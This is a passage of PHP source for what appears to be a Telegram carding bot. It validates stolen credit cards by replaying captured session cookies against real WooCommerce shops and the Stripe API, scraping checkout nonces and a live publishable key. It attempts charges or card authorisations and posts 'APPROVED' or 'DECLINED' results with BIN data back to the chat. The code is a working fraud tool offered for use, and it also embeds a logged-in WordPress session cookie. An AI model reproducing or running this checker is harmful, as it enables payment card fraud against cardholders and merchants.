sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
curl_close($curl);



} else {
//    echo "El carrito contiene producto";
///POR SI EO CARRO YA TIENE PRODUCTO////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);

$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];

curl_close($curl);
//echo "$nonce";

}



////Extrae el link/////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com?wc-ajax=checkout',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.naturexnauts.com%2F&wc_order_attribution_session_start_time=2024-11-03+22%3A27%3A04&wc_order_attribution_session_pages=18&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F130.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=AZ&billing_postcode=10010&billing_phone=4179204022&billing_email=Dausitherer%40cuvox.de&shipping_first_name=Carlos&shipping_last_name=Perez&shipping_company=&shipping_country=US&shipping_address_1=6195+bollinger+rd&shipping_address_2=&shipping_city=New+york&shipping_state=AZ&shipping_postcode=10010&order_comments=&shipping_method%5B0%5D=flexible_shipping_single%3A1&payment_method=mallpay_new&mallpay_new_card_number='.$cc.'&mallpay_new_clientIP=&cardpay_time_zone=-6&checkout_time=&mallpay_new_card_expiration_month='.$mes.'&mallpay_new_card_expiration_year='.$ano.'&mallpay_new_card_csc='.$cvv.'&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.naturexnauts.com',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$link = $json["redirect"];
///EXTRAE EL MONTO///
$patron = '/orderAmount=(\d+\.\d+)/';
preg_match($patron, $response, $coincidencias);
//if (!empty($coincidencias)) {
    $monto = $coincidencias[1] . '$'; // Concatenamos el símbol>
//    echo $monto; // Salida: 39.99$
//} else {

//echo "$response\n\n";
$response1 = $response;
curl_close($curl);



////HACE LA COMPRA///
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => $link,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
///EXTRE EL MENSAJE COMPLETO///
$patron = '/Payment Information: (.*)<\/li>/';
preg_match($patron, $response, $coincidencias);
$payment_info = $coincidencias[1];
///EXTRE EL MENSAGE CON CODIGOS///
$patron = '/:(.*)\,/';
preg_match($patron, $payment_info, $coincidencias);
$respo1 = trim($coincidencias[1]);
//Extrae el mensaje
$patron = '/[\d:|]/';
$respo = preg_replace($patron, '', $respo1);
curl_close($curl);

//echo "CODE: $respo - $monto\n";


///VERIFICA EL TINPO DE PROCESAMIENTO///
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response1;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Shopify (".$monto.")\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Your card was declined.') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction refused') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Shopify (".$monto.")\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR  ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Shopify (".$monto.")\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}



elseif((strpos($message, "!ho") === 0)||(strpos($message, "/ho") === 0)||(strpos($message, ".ho") === 0)){
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
//$ano   = $i[2];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

                                                                      
$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
        if($verify != ""){
                $respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
                sendMessage($chat_id,$respuesta, $message_id);
                die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
	
}else{
        $respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ho cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ho cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ho cc|m|y|cvv\n";
	sendMessage($chat_id,$respuesta, $message_id);
	die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

////EXTRAE EL NONCE////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; __stripe_sid=337ffb0d-efc1-4bb9-8fbd-ffd9f4b4671244dd9a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731001401%7CCzBZx9kfPDJBYaMXtoBLjqHevXVnNFrVeSWmlEPn2Fk%7C75f66fe98f5174c97872c8da71c4ea525dcd112cd950bf764a961c85189cdb4e; mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fedit-account%2F; sbjs_session=pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
/////
$patron = '/pk_live_[a-zA-Z0-9]*/';
preg_match($patron, $response, $coincidencia);
$pk_live = $coincidencia[0];
curl_close($curl);

/////EXTRAE EL ID//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fea0a361bb5%3B+stripe-js-v3%2Fea0a361bb5%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhoamemberservices.com&time_on_page=66639&client_attribution_metadata%5Bclient_session_id%5D=0e6aa10b-d993-4249-85d0-0edb6611a74b&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42&sid=337ffb0d-efc1-4bb9-8fbd-ffd9f4b4671244dd9a&key='.$pk_live.'&_stripe_version=2024-06-20',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);

////HACE EL AUTH///
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; __stripe_sid=337ffb0d-efc1-4bb9-8fbd-ffd9f4b4671244dd9a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731001401%7CCzBZx9kfPDJBYaMXtoBLjqHevXVnNFrVeSWmlEPn2Fk%7C75f66fe98f5174c97872c8da71c4ea525dcd112cd950bf764a961c85189cdb4e; sbjs_session=pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'X-Requested-With: XMLHttpRequest',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Origin: https://hoamemberservices.com',
    'Referer: https://hoamemberservices.com/my-account/add-payment-method/',
  ],
]);
/*
$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$respo = $json['data']['error']['message'];
curl_close($curl);
echo $respo;
*/
$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fedit-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; 